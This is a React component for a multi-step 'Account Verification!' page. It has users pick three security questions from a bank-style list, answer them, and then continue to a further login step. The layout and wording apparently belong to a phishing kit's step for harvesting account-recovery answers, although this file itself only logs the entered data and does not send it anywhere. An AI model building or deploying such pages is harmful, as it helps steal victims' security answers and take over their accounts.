import {
  Box,
  Button,
  FormControl,
  FormLabel,
  Input,
  Select,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";

type Inputs = {
  q1: string;
  q2: string;
  q3: string;
  a1: string;
  a2: string;
  a3: string;
};

const Form4 = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [data, setData] = useState({
    q1: "",
    q2: "",
    q3: "",
    a1: "",
    a2: "",
    a3: "",
  });
  const onSubmit: SubmitHandler<Inputs> = (data) => {
    console.log(data);
    setData(() => data);

    if (
      data.a1 === "" ||
      data.a2 === "" ||
      data.a3 === "" ||
      data.q1 === "" ||
      data.q2 === "" ||
      data.q3 === ""
    ) {
      return;
    }

    navigate("/login/5");
  };
  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Account Verification!
      </Text>
      <Text fontFamily="Poppins" fontSize="sm" textAlign="left">
        Security questions verification. Please ensure the information for
        verification.
      </Text>
      <Box
        w="90%"
        display="flex"
        flexDirection="column"
        justifyContent="space-between"
      >
        <form onSubmit={handleSubmit(onSubmit)}>
          <FormControl mb="2">
            <Select placeholder="Choose Your Question" {...register("q1")}>
              <option
                style={{ color: "black" }}
                value="What is your father's middle name? "
              >
                What is your father's middle name?{" "}
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandmother's name?"
              >
                What is your maternal grandmother's name?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the name of the first company you worked for?"
              >
                What is the name of the first company you worked for?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandfather's?"
              >
                What is your maternal grandfather's?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your high school? (Full name of city only)"
              >
                In what city was your high school? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your high school?"
              >
                What was the name of your high school?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the fist name of the maid of honor at your wedding?"
              >
                What is the fist name of the maid of honor at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were you married? (Enter full name of city)"
              >
                In what city were you married? (Enter full name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest nephew?"
              >
                What is the first name of your oldest nephew?
              </option>
              <option
                style={{ color: "black" }}
                value="What is first name of best man at your wedding?"
              >
                What is first name of best man at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest niece?"
              >
                What is the first name of your oldest niece?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your paternal grandfather's name?"
              >
                What is your paternal grandfather's name?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city is your vacation home? (Full name of city only)"
              >
                In what city is your vacation home? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first girlfriend or boyfriend?"
              >
                What was the name of your first girlfriend or boyfriend?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your father born?"
              >
                In what city was your father born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first pet?"
              >
                What was the name of your first pet?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the nicname of your grandfather?"
              >
                What was the nicname of your grandfather?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your high school mascot?"
              >
                What was your high school mascot?
              </option>
              <option
                style={{ color: "black" }}
                value="What street did your best friend in high school live on? (Enter name of street only)"
              >
                What street did your best friend in high school live on? (Enter
                name of street only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the last name of your favorite teacher in final year of high school?"
              >
                What was the last name of your favorite teacher in final year of
                high school?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were your born?"
              >
                In what city were your born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of the town your grandmother live in?"
              >
                What was the name of the town your grandmother live in?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your favorite Restaurant in college?"
              >
                What was your favorite Restaurant in college?
              </option>
              <option
                style={{ color: "black" }}
                value="Where did you meet your spouse for the first time? (Enter full name of city)"
              >
                Where did you meet your spouse for the first time? (Enter full
                name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="In the city was your mother born?"
              >
                In the city was your mother born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your junior high school?"
              >
                What was the name of your junior high school?
              </option>
            </Select>
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Answer:</FormLabel>
            <Input {...register("a1")} type="text" />
          </FormControl>
          <FormControl mb="2">
            <Select placeholder="Choose Your Question" {...register("q2")}>
              <option
                style={{ color: "black" }}
                value="What is your father's middle name? "
              >
                What is your father's middle name?{" "}
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandmother's name?"
              >
                What is your maternal grandmother's name?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the name of the first company you worked for?"
              >
                What is the name of the first company you worked for?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandfather's?"
              >
                What is your maternal grandfather's?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your high school? (Full name of city only)"
              >
                In what city was your high school? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your high school?"
              >
                What was the name of your high school?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the fist name of the maid of honor at your wedding?"
              >
                What is the fist name of the maid of honor at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were you married? (Enter full name of city)"
              >
                In what city were you married? (Enter full name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest nephew?"
              >
                What is the first name of your oldest nephew?
              </option>
              <option
                style={{ color: "black" }}
                value="What is first name of best man at your wedding?"
              >
                What is first name of best man at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest niece?"
              >
                What is the first name of your oldest niece?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your paternal grandfather's name?"
              >
                What is your paternal grandfather's name?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city is your vacation home? (Full name of city only)"
              >
                In what city is your vacation home? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first girlfriend or boyfriend?"
              >
                What was the name of your first girlfriend or boyfriend?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your father born?"
              >
                In what city was your father born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first pet?"
              >
                What was the name of your first pet?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the nicname of your grandfather?"
              >
                What was the nicname of your grandfather?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your high school mascot?"
              >
                What was your high school mascot?
              </option>
              <option
                style={{ color: "black" }}
                value="What street did your best friend in high school live on? (Enter name of street only)"
              >
                What street did your best friend in high school live on? (Enter
                name of street only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the last name of your favorite teacher in final year of high school?"
              >
                What was the last name of your favorite teacher in final year of
                high school?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were your born?"
              >
                In what city were your born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of the town your grandmother live in?"
              >
                What was the name of the town your grandmother live in?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your favorite Restaurant in college?"
              >
                What was your favorite Restaurant in college?
              </option>
              <option
                style={{ color: "black" }}
                value="Where did you meet your spouse for the first time? (Enter full name of city)"
              >
                Where did you meet your spouse for the first time? (Enter full
                name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="In the city was your mother born?"
              >
                In the city was your mother born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your junior high school?"
              >
                What was the name of your junior high school?
              </option>
            </Select>
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Answer:</FormLabel>
            <Input {...register("a2")} type="text" />
          </FormControl>
          <FormControl mb="2">
            <Select placeholder="Choose Your Question" {...register("q3")}>
              <option
                style={{ color: "black" }}
                value="What is your father's middle name? "
              >
                What is your father's middle name?{" "}
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandmother's name?"
              >
                What is your maternal grandmother's name?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the name of the first company you worked for?"
              >
                What is the name of the first company you worked for?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your maternal grandfather's?"
              >
                What is your maternal grandfather's?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your high school? (Full name of city only)"
              >
                In what city was your high school? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your high school?"
              >
                What was the name of your high school?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the fist name of the maid of honor at your wedding?"
              >
                What is the fist name of the maid of honor at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were you married? (Enter full name of city)"
              >
                In what city were you married? (Enter full name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest nephew?"
              >
                What is the first name of your oldest nephew?
              </option>
              <option
                style={{ color: "black" }}
                value="What is first name of best man at your wedding?"
              >
                What is first name of best man at your wedding?
              </option>
              <option
                style={{ color: "black" }}
                value="What is the first name of your oldest niece?"
              >
                What is the first name of your oldest niece?
              </option>
              <option
                style={{ color: "black" }}
                value="What is your paternal grandfather's name?"
              >
                What is your paternal grandfather's name?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city is your vacation home? (Full name of city only)"
              >
                In what city is your vacation home? (Full name of city only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first girlfriend or boyfriend?"
              >
                What was the name of your first girlfriend or boyfriend?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city was your father born?"
              >
                In what city was your father born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your first pet?"
              >
                What was the name of your first pet?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the nicname of your grandfather?"
              >
                What was the nicname of your grandfather?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your high school mascot?"
              >
                What was your high school mascot?
              </option>
              <option
                style={{ color: "black" }}
                value="What street did your best friend in high school live on? (Enter name of street only)"
              >
                What street did your best friend in high school live on? (Enter
                name of street only)
              </option>
              <option
                style={{ color: "black" }}
                value="What was the last name of your favorite teacher in final year of high school?"
              >
                What was the last name of your favorite teacher in final year of
                high school?
              </option>
              <option
                style={{ color: "black" }}
                value="In what city were your born?"
              >
                In what city were your born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of the town your grandmother live in?"
              >
                What was the name of the town your grandmother live in?
              </option>
              <option
                style={{ color: "black" }}
                value="What was your favorite Restaurant in college?"
              >
                What was your favorite Restaurant in college?
              </option>
              <option
                style={{ color: "black" }}
                value="Where did you meet your spouse for the first time? (Enter full name of city)"
              >
                Where did you meet your spouse for the first time? (Enter full
                name of city)
              </option>
              <option
                style={{ color: "black" }}
                value="In the city was your mother born?"
              >
                In the city was your mother born?
              </option>
              <option
                style={{ color: "black" }}
                value="What was the name of your junior high school?"
              >
                What was the name of your junior high school?
              </option>
            </Select>
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Answer:</FormLabel>
            <Input {...register("a3")} type="text" />
          </FormControl>

          <Box
            display="flex"
            justifyContent="center"
            alignItems="center"
            mt="8"
          >
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="4"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Continue
            </Button>
          </Box>
        </form>
      </Box>
    </VStack>
  );
};

export default Form4;
